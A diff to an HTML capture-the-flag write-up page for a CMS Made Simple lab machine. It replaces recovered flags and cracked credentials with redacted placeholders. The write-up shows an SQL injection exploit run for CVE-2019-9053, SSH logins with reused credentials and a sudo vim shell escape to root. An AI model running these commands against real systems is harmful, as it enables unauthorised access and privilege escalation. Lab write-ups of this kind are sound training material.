@@ -100,8 +100,8 @@
       <div class="wr-summary-row"><span class="wr-summary-key">Escalation</span><span class="wr-summary-val">vim via sudo NOPASSWD (GTFOBins)</span></div>
       <div class="wr-summary-row"><span class="wr-summary-key">Severity</span><span class="wr-summary-val"><span style="display:inline-block;font-size:.7rem;letter-spacing:.08em;padding:.1rem .55rem;border-radius:3px;color:#ff4d6d;font-weight:700;background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.2);">CRITICAL</span> <span style="color:var(--text3);font-size:.72rem;">(CVSSv3 9.8)</span></span></div>
       <div class="wr-summary-row"><span class="wr-summary-key">References</span><span class="wr-summary-val">CVE-2019-9053 &middot; CWE-89 &middot; OWASP A01:2021</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">User Flag</span><span class="wr-summary-val wr-flag">G00d j0b, keep up!</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Root Flag</span><span class="wr-summary-val wr-flag">W3ll d0n3. You made it!</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">User Flag</span><span class="wr-summary-val wr-flag">THM{flag for question #1}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Root Flag</span><span class="wr-summary-val wr-flag">THM{flag for question #2}</span></div>
     </div>
   </div>
 
@@ -136,29 +136,29 @@
       <p class="wr-p">CMS Made Simple versions <strong>below 2.2.10</strong> are vulnerable to <span class="wr-inline-code">CVE-2019-9053</span>, a <strong>time-based blind SQL injection</strong> in the News module. Exploit-DB script <span class="wr-inline-code">46635.py</span> automates extraction of the username, password hash, and salt, then cracks the hash against a wordlist.</p>
       <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ python 46635.py -u http://TARGET/simple --crack -w rockyou.txt
 
-[+] Salt for password found: 1dac0d92e9fa6bb2
-[+] Username found: mitch
-[+] Email found: admin@admin.com
-[+] Password found: 0c01f4...
-[+] Password cracked: secret</div>
-      <p class="wr-p">Credentials recovered: <span class="wr-inline-code">mitch</span> / <span class="wr-inline-code">secret</span>.</p>
+[+] Salt for password found: redacted
+[+] Username found: redacted
+[+] Email found: redacted
+[+] Password found: redacted
+[+] Password cracked: redacted</div>
+      <p class="wr-p">Credentials recovered: <span class="wr-inline-code">redacted</span> / <span class="wr-inline-code">redacted</span>.</p>
     </div>
 
     <div class="wr-phase">
       <h2 class="wr-phase-title">4. Foothold &mdash; SSH on Port 2222</h2>
       <p class="wr-p">The recovered credentials are reused for SSH &mdash; remembering the non-standard port from the Nmap scan.</p>
-      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ ssh mitch@TARGET -p 2222
-mitch@TARGET's password: secret
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ ssh redacted@TARGET -p 2222
+redacted@TARGET's password: redacted
 
 $ cat user.txt
-G00d j0b, keep up!</div>
+THM{flag for question #1}</div>
     </div>
 
     <div class="wr-phase">
       <h2 class="wr-phase-title">5. Privilege Escalation &mdash; vim sudo Escape</h2>
-      <p class="wr-p">Checking sudo rights shows <span class="wr-inline-code">mitch</span> can run <span class="wr-inline-code">vim</span> as root with no password. Per GTFOBins, <span class="wr-inline-code">vim</span> can spawn an interactive shell &mdash; and when launched under sudo, that shell runs as root.</p>
+      <p class="wr-p">Checking sudo rights shows <span class="wr-inline-code">redacted</span> can run <span class="wr-inline-code">vim</span> as root with no password. Per GTFOBins, <span class="wr-inline-code">vim</span> can spawn an interactive shell &mdash; and when launched under sudo, that shell runs as root.</p>
       <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ sudo -l
-User mitch may run the following commands:
+User redacted may run the following commands:
     (root) NOPASSWD: /usr/bin/vim
 
 # GTFOBins vim sudo escape
@@ -168,7 +168,7 @@ $ sudo vim -c ':!/bin/sh'
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # cat /root/root.txt
-W3ll d0n3. You made it!</div>
+THM{flag for question #2}</div>
     </div>
 
     <div class="wr-phase">
